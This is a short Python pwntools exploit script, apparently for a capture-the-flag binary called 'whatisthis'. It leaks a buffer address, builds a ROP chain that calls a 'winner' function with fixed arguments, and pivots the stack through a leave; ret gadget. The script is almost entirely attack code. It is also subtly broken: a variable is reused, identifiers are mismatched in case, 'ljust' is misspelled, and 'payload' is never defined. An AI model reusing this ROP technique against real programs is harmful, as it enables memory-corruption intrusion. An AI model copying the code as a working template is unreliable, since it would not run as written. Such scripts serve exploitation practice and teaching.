from pwn import *

elf = context.binary = ELF('./whatisthis')
p = process()

p.recvuntil("3. ")
buff = int(p.recvline(), 16)
log.success(f'buffer: {hex(buff)}')

leave_Ret = 0x4012cc
pop_rdi = 0x4011d1
pop_rsi_r15 = 0x4011cf

p = flat(
	0x0,
	pop_rdi,
	0xdeadbeef,
	pop_Rsi_r15,
	0xdeadc0de,
	0x0,
	elf.sym['winner']
)

p = p.1just(256, b'A')

p += flat (buff, leave_ret)
pause()
p.sendline(payload)
print(p.recvline())
